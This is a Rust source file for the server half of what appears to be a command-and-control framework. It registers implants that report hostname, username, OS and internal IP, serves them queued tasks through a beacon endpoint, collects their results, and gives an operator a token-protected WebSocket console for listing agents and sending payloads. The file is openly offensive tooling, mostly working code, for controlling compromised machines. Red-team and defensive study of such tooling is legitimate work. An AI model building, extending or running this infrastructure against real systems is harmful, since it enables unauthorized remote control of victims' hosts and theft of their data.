mod models;
mod customheaders;
use models::*;
use customheaders::*;
use std::{collections::{HashMap,VecDeque}, thread::current};
use axum::{
    Json, Router, extract::{State, rejection::{self, JsonRejection}, 
    ws::{CloseFrame, Message, WebSocket, WebSocketUpgrade}}, http::{self, HeaderMap, StatusCode, header::AUTHORIZATION}, response::IntoResponse, routing::{any, get, post},
};
use futures_util::{sink::SinkExt,stream::{StreamExt, SplitSink, SplitStream}};
use tokio::{net::TcpListener, sync::broadcast::error::RecvError};
use tokio::{sync::{RwLock,Mutex,broadcast,mpsc}};
use std::sync::{Arc,atomic};
use ::serde::{Serialize,Deserialize};
use uuid::{Uuid};
use dotenvy::dotenv;
use std::env;

#[derive(Clone, Debug, Serialize, Deserialize)]
pub enum TaskResult
{
    Text(Result<String,String>), //output string
    Binary(Result<Vec<u8>,String>), //binary stream
    Status(Result<(),String>), //status update -> empty tuple if success
    Shutdown
}

#[derive(Clone,Serialize,Deserialize,Debug)]
pub struct Task
{
    task_id:u64,
    agent_id:String,
    instruction:BeaconArgs,
    sent:bool,
    result:Option<TaskResult>
}

#[derive(Clone,Debug)]
pub struct Agent
{
    id: String,
    hostname:String,
    os:String,
    username:String,
    internal_ip:String,
    sleep:u64,
    jitter:u64,
    task_queue: Arc<tokio::sync::Mutex<Vec<Task>>>,
    task_results: Arc<tokio::sync::Mutex<Vec<Task>>>
}

#[derive(Clone,Serialize,Deserialize,Debug)]
pub struct AgentPayload
{
    id: String,
    hostname:String,
    os:String,
    username:String,
    internal_ip:String,
    task_queue:Vec<Task>,
    task_results:Vec<Task>
}

pub struct AgentState //All agents and command history
{
    pub agents:Arc<RwLock<HashMap<String,Arc<tokio::sync::Mutex<Agent>>>>>,
    pub pending_tasks:Arc<RwLock<Vec<Task>>>,
    pub task_id:std::sync::atomic::AtomicU64,
    pub broadcast_sender:broadcast::Sender<Message>,
    pub client_registry:Arc<RwLock<HashMap<String, mpsc::UnboundedSender<Message>>>>
}

#[tokio::main]
async fn main() {
    dotenvy::dotenv().ok();
    let (tx,_rx)=tokio::sync::broadcast::channel::<Message>(100);
    let shared_state=Arc::new(AgentState{
        agents:Arc::new(RwLock::new(HashMap::new())),
        pending_tasks:Arc::new(RwLock::new(Vec::new())),
        task_id:std::sync::atomic::AtomicU64::new(1),
        broadcast_sender:tx,
        client_registry:Arc::new(RwLock::new(HashMap::new()))
    });
    let op_routes=Router::new()
    .route("/ws",any(ws_handler))
    .route("/",get(health_check))
    .with_state(shared_state.clone());
    //TODO: Bind to URLs set in .env file

    let health_route=Router::new()
    .route("/health", get(health_check));
    let op_app=Router::new()
    .merge(op_routes)
    .merge(health_route);
    let op_listener = TcpListener::bind("127.0.0.1:3000").await.unwrap();
    tokio::spawn(async move{
        axum::serve(op_listener, op_app).await.unwrap();
    });
    
    //TODO: Bind to URLs set in .env file
    let impl_route=Router::new()
    .route("/beacon",get(implant_beacon))
    .route("/result",post(implant_result))
    .route("/register",post(implant_register))
    .with_state(shared_state.clone());
    let agent_app=Router::new()
    .nest("/api", impl_route);

    let agent_listener = TcpListener::bind("0.0.0.0:3001").await.unwrap(); //change to public facing address
    axum::serve(agent_listener, agent_app).await.unwrap();
}

//IMPLANT HANDLERS HERE

//TODO: Replace JSON serialization with Postcard
// #[axum::debug_handler]
async fn implant_register(State(state):State<Arc<AgentState>>,payload:Result<Json<AgentPayload>,JsonRejection>)->Result<(StatusCode,Json<Uuid>),StatusCode>
{
    //TODO: implement fallback if hostname, os, username, internal_ip are malformed or cannot be found
    match payload {
        Ok(Json(data)) => {
            let new_uuid_global=Uuid::new_v4();
            //TODO:
            //if implant already exists, update hostname, os, username, internal ip, etc.
            //if not generate a new global ID for the dictionary
            {
                let mut write_guard=state.agents.write().await;
                write_guard.insert(new_uuid_global.to_string().clone(),
                    Arc::new(
                    tokio::sync::Mutex::new(
                            Agent{
                                id:new_uuid_global.to_string(),
                                hostname:data.hostname.clone(),
                                os:data.os.clone(),
                                username:data.username.clone(),
                                internal_ip:data.internal_ip.clone(),
                                sleep:30000,
                                jitter:10000,
                                task_queue:Arc::new(Mutex::new(Vec::new())),
                                task_results:Arc::new(Mutex::new(Vec::new()))
                            }
                )));
            }
            if let Err(_) = state.broadcast_sender.send(Message::Text(format!("Implant {} has registered!\n",new_uuid_global.to_string()).into())){
                println!("Task registration message failed to send!");
            };
            return Ok((StatusCode::CREATED,Json(new_uuid_global)));
        }
        Err(JsonRejection::MissingJsonContentType(_)) => {
            // Request didn't have `Content-Type: application/json`
            // header
            return Err(StatusCode::BAD_REQUEST);
        }
        Err(JsonRejection::JsonDataError(_)) => {
            // Couldn't deserialize the body into the target type
            return Err(StatusCode::BAD_REQUEST);
        }
        Err(JsonRejection::JsonSyntaxError(_)) => {
            // Syntax error in the body
            return Err(StatusCode::UNPROCESSABLE_ENTITY);
        }
        Err(JsonRejection::BytesRejection(_)) => {
            // Failed to extract the request body
            return Err(StatusCode::INTERNAL_SERVER_ERROR);
        }
        Err(_) => {
            // `JsonRejection` is marked `#[non_exhaustive]` so match must
            // include a catch-all case.
            return Err(StatusCode::INTERNAL_SERVER_ERROR);
        }
    }
}

//TODO: Pending queue implementation: move tasks to a "limbo" queue; 
//only move into the results queue either when the agent responds with an acknowledgement or finishes the task
//TODO: Change implant handlers' return type to impl intoresponse

// #[axum::debug_handler]
async fn implant_result(State(state):State<Arc<AgentState>>,payload:Result<Json<Vec<Task>>,JsonRejection>)->impl IntoResponse
{
    match payload {
        //TODO: Add code to find and remove corresponding task from the pending queue in state
        Ok(Json(tasks)) => {
            let mut success:bool=true;
            for task in tasks{
                let ref_res_queue: Option<Arc<tokio::sync::Mutex<Vec<Task>>>>={
                    let state_guard=state.agents.read().await;
                    // if (!state_guard.contains_key(&task.agent_id.clone())){
                    //     return StatusCode::INTERNAL_SERVER_ERROR;
                    // }
                    let opt_agent_mutex=state_guard.get(&task.agent_id).cloned();
                    drop(state_guard);
                    if let Some(agent_mutex)=opt_agent_mutex
                        {
                            let read_guard=agent_mutex.lock().await;
                            Some(Arc::clone(&read_guard.task_results))
                        }
                    else {
                        None
                    }
                };
                // let mut target_agent=read_guard.get_mut(&task.agent_id);
                let output_id=task.task_id.clone();
                if let Some(res_queue)=ref_res_queue{
                    res_queue.lock().await.push(task.clone());
                }
                else
                {
                    success=false;
                }
                if let Err(_) = state.broadcast_sender.send(Message::Text(format!("Task {} result is available!\n",output_id).into())){
                    println!("Task update failed to send!");
                };
            }
            if success{
                (StatusCode::OK, "Success").into_response()
            }
            else{
                (StatusCode::IM_A_TEAPOT,"Error adding task results").into_response()
            }
        }
        Err(_) => {
            (StatusCode::INTERNAL_SERVER_ERROR,"Task list not found").into_response()
        }
    }
    // Ok(StatusCode::OK)
}

// #[axum::debug_handler]
async fn implant_beacon(
    ExtractCookie(user_agent):ExtractCookie,
    State(state):State<Arc<AgentState>>, 
)->Result<(StatusCode,Json<Vec<Task>>),StatusCode>
{
    // println!("beacon accessed");
    //COMPLETED: Extract agent UUID from custom header
    let Ok(user_id)=user_agent.to_str() else {
        return Err(StatusCode::UNAUTHORIZED);
    };
    let agent_uuid={
        match Uuid::parse_str(user_id)
        {
            Ok(uuid)=>{uuid}
            Err(_)=>{return Err(StatusCode::UNAUTHORIZED);}
        }
    };
    //poll agent's task queue for tasks
    let agent_task_queue={
        let state_guard=state.agents.read().await;
        // if (!state_guard.contains_key(&agent_uuid.to_string())){
        //     return Err(StatusCode::UNAUTHORIZED);
        // }
        let opt_agent_mutex=state_guard.get(&agent_uuid.to_string()).cloned();
        drop(state_guard);
        if let Some(agent_mutex)=opt_agent_mutex
        {
            let read_guard=agent_mutex.lock().await;
            Some(Arc::clone(&read_guard.task_queue))
        }
        else {
            None
        }
    };
    let tasks_sent:Vec<Task>={
        if let Some(agent_to_do)=agent_task_queue{
            let mut queue_guard=agent_to_do.lock().await;
            std::mem::take(&mut *queue_guard)
        }
        else {
            Vec::new()
        }
    };
    
    //move task to pending state
    let mut write_guard=state.pending_tasks.write().await;
    write_guard.append(&mut tasks_sent.clone());
    //send task details to implant as JSON
    return Ok((StatusCode::OK,Json(tasks_sent)));
}

//OPERATOR HANDLERS HERE
#[axum::debug_handler]
//websocket upgrader
async fn ws_handler(
    ExtractAuthorizationToken(token):ExtractAuthorizationToken,
    ws:WebSocketUpgrade,
    State(state):State<Arc<AgentState>>
)->impl IntoResponse{
    //COMPLETED: handle websockets authentication by extracting token from Authorization header here?
    // let state_clone=state.clone();
    let Ok(str_token)=token.to_str() else {
        return (StatusCode::UNAUTHORIZED,"Not found!").into_response();
    };
    if (!is_valid_token(str_token)){
        return (StatusCode::UNAUTHORIZED,"Token invalid!").into_response();
    }
    return ws.on_failed_upgrade(|error|println!("Error upgrading websocket {}",error))
    .on_upgrade(|socket|handle_socket(socket,state));
}

//TODO: Add Websockets heartbeat connection
//websocket state machine
async fn handle_socket(
    socket:WebSocket,
    state:Arc<AgentState>
){
    let rx=state.broadcast_sender.subscribe();
    let (mailbox_tx, mailbox_rx)=mpsc::channel::<Message>(64);
    let (sender, recver)=socket.split();
    let mut forwarder=tokio::spawn(broadcast_transfer(rx, mailbox_tx.clone()));
    let mut sendtask=tokio::spawn(write(sender,mailbox_rx));
    let mut recvtask=tokio::spawn(read(recver,state,mailbox_tx));
    let _=tokio::select!(
        _rv_write=(&mut sendtask)=>{
            if let Err(a)=_rv_write{
                println!("Error sending messages to client; Error: {a:?}");
            }
            recvtask.abort();
            forwarder.abort();
        },
        _rv_read=(&mut recvtask)=>{
            if let Err(a)=_rv_read{
                println!("Error reading messages from client; Error: {a:?}");
            }
            sendtask.abort();
            forwarder.abort();
        },
        _rv_transfer=(&mut forwarder)=>{
            if let Err(a)=_rv_transfer{
                println!("Error distributing broadcast messages; Error: {a:?}");
            }
            recvtask.abort();
            sendtask.abort();
        }
    );
}

async fn broadcast_transfer(
    mut rx:broadcast::Receiver<Message>,
    mailbox_tx:mpsc::Sender<Message>
){
    //broadcast channel forwarder function will hold the broadcast receiver and move each message one by one to the mpsc
    loop{
        match rx.recv().await{
            Ok(msg)=>{
                if let Err(_)=mailbox_tx.send(msg).await{
                    break;
                };
            }
            Err(RecvError::Lagged(count))=>{
                println!("System lag, missed {} messages",count);
                continue;
            }       
            Err(_)=>{
                break;
            }
        }
    }
}

async fn read(
    mut receiver:SplitStream<WebSocket>,
    state:Arc<AgentState>,
    mailbox_tx:mpsc::Sender<Message>
){
    let mut current_agent=String::new();
    while let Some(msg)=receiver.next().await{
        match msg{
            Ok(Message::Text(t))=>{
                match ServerCommands::try_from(t.as_str()){
                    Ok(ServerCommands::SwitchAgent(id))=>{
                        //Check if given ID is a valid agent and switch agent if it is
                        let read_guard=state.agents.read().await;
                        if (read_guard.contains_key(&id))
                        {
                            current_agent=id;
                        }
                        else
                        {
                            let _ =mailbox_tx.send(Message::Text(format!("Agent not found\n").into())).await;
                        }
                    }
                    Ok(ServerCommands::GetAgent(id))=>{
                        //add lookup of agent info to mailbox queue
                        let read_guard_agent=state.agents.read().await;
                        let opt_mutex_agent=read_guard_agent.get(&id).cloned();
                        drop(read_guard_agent);
                        let (
                            agent_id,
                            agent_hostname,
                            agent_os,
                            agent_username,
                            agent_internal_ip,
                            agent_tasks,
                            agent_results
                        )=if let Some(agent_mutex)=opt_mutex_agent{
                            let agent=agent_mutex.lock().await;
                            (
                                agent.id.clone(),
                                agent.hostname.clone(),
                                agent.os.clone(),
                                agent.username.clone(),
                                agent.internal_ip.clone(),
                                agent.task_queue.clone(),
                                agent.task_results.clone()
                            )
                        }
                        else{
                            let _ =mailbox_tx.send(Message::Text("Error finding agent!\n".into())).await;
                            continue;
                        };
                        let agent_info={
                            let agent_tasks_clone=agent_tasks.lock().await.clone();
                            let agent_result_clone=agent_results.lock().await.clone();
                            AgentPayload{
                                id:agent_id,
                                hostname:agent_hostname,
                                os:agent_os,
                                username:agent_username,
                                internal_ip:agent_internal_ip,
                                task_queue:agent_tasks_clone,
                                task_results:agent_result_clone
                            }   
                        };
                        //TODO: convert agent to agentpayload, which is json serializable
                        let agent_json=serde_json::to_string(&agent_info);
                        if let Ok(json)=agent_json{
                            let _ =mailbox_tx.send(Message::Text(format!("Agent {id}: {json}\n").into())).await;
                        };
                    }
                    Ok(ServerCommands::GetAgents)=>{
                        //add list of agent IDs
                        let agent_keys:Vec<String>={
                            let read_guard=state.agents.read().await;
                            read_guard.keys().cloned().collect()
                        };
                        let json_output=serde_json::to_string(&agent_keys);
                        if let Ok(json)=json_output{
                            let _ =mailbox_tx.send(Message::Text(format!("Agent ID List: {}\n",json).into())).await;
                        };
                    }
                    Ok(ServerCommands::GetTask(id))=>{
                        //add task to the mailbox queue
                        //TODO: establish an efficient way to lookup tasks
                        let _ =mailbox_tx.send(Message::Text("WIP, please use GetAgents to view all tasks for now.\n".into())).await;
                    }
                    Ok(ServerCommands::Payload(payload))=>{
                        //COMPLETED: if current_agent is still String::new(), stop and force them to switch to an actual agent
                        if (current_agent.is_empty())
                        {
                            //Does the entire websockets connection need to be shut down if this fails?
                            let _ =mailbox_tx.send(Message::Text("Switch Agent: Please switch to a valid agent!\n".into())).await;
                            continue;
                        }
                        else 
                        {
                            let agent_task_queue:Option<Arc<tokio::sync::Mutex<Vec<Task>>>>={
                                let state_guard=state.agents.read().await;
                                let opt_agent_mutex=state_guard.get(&current_agent).cloned();
                                drop(state_guard);
                                if let Some(agent_mutex)=opt_agent_mutex{
                                    let read_guard=agent_mutex.lock().await;
                                    Some(Arc::clone(&read_guard.task_queue))
                                }
                                else {
                                    None
                                }
                            };
                            if let Some(task_queue)=agent_task_queue{
                                let task_increment={state.task_id.fetch_add(1,atomic::Ordering::Relaxed)+1};
                                task_queue.lock().await.push(Task{
                                    task_id:task_increment,
                                    agent_id:current_agent.clone(),
                                    instruction:payload,
                                    sent:false,
                                    result:None
                                });
                            }
                            else{
                                //TODO: if current agent doesn't exist in the map tell the client
                                let _ =mailbox_tx.send(Message::Text("Task queue not found\n".into())).await;
                            }
                        }
                        //add task to the agent queue
                    }
                    Err(_)=>{
                        println!("Command malformed");
                        let _ =mailbox_tx.send(Message::Text("Command invalid!\n".into())).await;
                    }
                }
            }
            Ok(Message::Close(_))=>{break;}
            Err(_)=>{return;}
            _=>{}
        }
    }
}

async fn write(
    mut sender:SplitSink<WebSocket,Message>,
    // state:Arc<AgentState>,
    mut mailbox_rx:mpsc::Receiver<Message>
){
    //Things to post back to client: (build a mpsc queue; complete)
    //Task results and agent information when requested by operator (sent to mpsc queue in the read function)
    //updates when results for tasks become available/are executed  (sent to mpsc queue in the implant_results API endpoint)
    //(for execution need to implement inflight visibility timeout first into the task beaconing functionality)
    loop{
        match mailbox_rx.recv().await{
            Some(msg)=>
            {
                if let Err(_)=sender.send(msg).await
                {
                    break;
                };
            }
            None=>{
                break;
            }
        }
    }
    
}

async fn op_get_all_agents(State(state):State<Arc<AgentState>>)->Result<(StatusCode,Json<Vec<AgentPayload>>),StatusCode>
{
    return Err(StatusCode::UNAUTHORIZED);
}

// #[axum::debug_handler]
async fn op_post_task(State(state):State<Arc<AgentState>>)->impl IntoResponse
{
    StatusCode::UNAUTHORIZED
}

// #[axum::debug_handler]
async fn op_get_task_result(State(state):State<Arc<AgentState>>)->Result<(StatusCode,Json<TaskResult>),StatusCode>
{
    return Err(StatusCode::UNAUTHORIZED);
}

async fn health_check()->&'static str
{
    "Fine"
}

fn is_valid_token(token:&str)->bool{
    let Ok (secret)=std::env::var("WS_SECRET")else{return false;};
    if (secret!=token){return false;}
    return true;
}